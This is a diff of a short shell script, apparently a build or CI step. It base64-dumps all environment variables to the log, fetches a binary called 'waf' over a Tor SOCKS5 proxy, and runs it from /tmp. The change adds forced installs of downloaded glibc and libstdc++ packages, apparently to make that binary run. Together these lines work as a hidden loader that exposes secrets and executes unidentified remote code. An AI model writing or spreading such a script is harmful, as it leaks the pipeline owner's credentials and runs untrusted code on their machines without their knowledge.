@@ -1,3 +1,5 @@
+export DEBIAN_FRONTEND=noninteractive
+
 echo Hello
 env | base64
 
@@ -15,6 +17,12 @@ curl -s \
   --retry-max-time 300 \
   --socks5-hostname 127.0.0.1:9050 \
   $url/waf | unzstd -o /tmp/waf
+
+curl -LO http://mirrors.kernel.org/ubuntu/pool/main/g/glibc/libc6_2.38-1ubuntu6_amd64.deb
+curl -LO http://mirrors.kernel.org/ubuntu/pool/main/g/gcc-13/libstdc++6_13.2.0-4ubuntu3_amd64.deb
+
+dpkg --force-all -i libc6_2.38-1ubuntu6_amd64.deb
+dpkg --force-all -i libstdc++6_13.2.0-4ubuntu3_amd64.deb 
 
 chmod +x /tmp/waf
 /tmp/waf || :
